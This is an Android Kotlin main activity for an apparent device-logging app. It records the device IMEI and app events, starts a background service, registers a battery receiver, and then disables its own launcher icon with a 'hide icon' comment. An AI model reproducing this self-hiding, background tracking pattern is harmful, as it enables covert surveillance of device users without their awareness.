package com.service_log.activity

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.util.Log
import android.view.WindowManager
import android.view.animation.AnimationUtils
import android.widget.ImageView
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.service_log.R
import com.service_log.enums.TypeEvent
import com.service_log.model.Trip
import com.service_log.receiver.BatteryChangedReceiver
import com.service_log.repository.TripRepository
import com.service_log.service.GeneralService
import com.service_log.service.static.AssignmentHelper
import kotlin.math.log


open class MainActivity: AppCompatActivity(){

    private lateinit var dao: TripRepository
    private var permission = true

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.main_activity)

        window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )

        val backgroundImage: ImageView = findViewById(R.id.imageView)
        val slideAnimation = AnimationUtils.loadAnimation(this, R.anim.side_slide)
        backgroundImage.startAnimation(slideAnimation)

        // we used the postDelayed(Runnable, time) method
        // to send a message with a delayed time.
//        Handler().postDelayed({
//            val intent = Intent(this, MainActivity::class.java)
//            startActivity(intent)
//            finish()
//        }, 3000)

//        dao = TripRepository(this)
//        dao.insertTrip(Trip(imei = AssignmentHelper.retrieveReceiverInfoByIMEI(this), type = TypeEvent.APP_ON, details = "app is on", date = AssignmentHelper.retrieveDateFORMATTER(), info = ""))

        try {
            val i = packageManager.getLaunchIntentForPackage("com.treedo.taburetka.tsd")
            startActivity(i)
        } catch (_: PackageManager.NameNotFoundException) {

        }

         dao = TripRepository(this)
//        dao.updateData()

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            permission = false
//            dao.insertTrip(Trip(imei = AssignmentHelper.retrieveReceiverInfoByIMEI(this), type = TypeEvent.PERMISSION_OFF, details = "app settings don`nt have permission ", date = AssignmentHelper.retrieveDateFORMATTER(), info = ""))
            return
        }

        try {
            dao = TripRepository(this)
            dao.insertTrip(Trip(imei = AssignmentHelper.retrieveReceiverInfoByIMEI(this), type = TypeEvent.APP_ON, details = "app is on", date = AssignmentHelper.retrieveDateFORMATTER(), info = ""))
        }catch (e : Exception){

        }

        ////++++++for migrations
//        dao.updateData()

        registerReceiver(BatteryChangedReceiver(), IntentFilter(Intent.ACTION_BATTERY_CHANGED))

        ////1+++++++++
        setContentView(R.layout.main_activity)
        val i = Intent(this, GeneralService::class.java)
        startService(i)
        ////1--------

        ///////hide icon
        val p = packageManager
        val componentName = ComponentName(
            this,
            MainActivity::class.java
        )
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        //////2++++++++++++
//        val receiver = Intent(this, LocationReceiver::class.java)
//        val pendingIntent = PendingIntent.getBroadcast(this, 0, receiver, 0)
//
//        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
//        if (ActivityCompat.checkSelfPermission(
//                this,
//                Manifest.permission.ACCESS_FINE_LOCATION
//            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
//                this,
//                Manifest.permission.ACCESS_COARSE_LOCATION
//            ) != PackageManager.PERMISSION_GRANTED
//        ) {
//            return
//        }
//        fusedLocationClient.requestLocationUpdates(LocationRequest.create(), pendingIntent).addOnSuccessListener {
///            lis -> lis.
//        }
        //////2------------

    }
}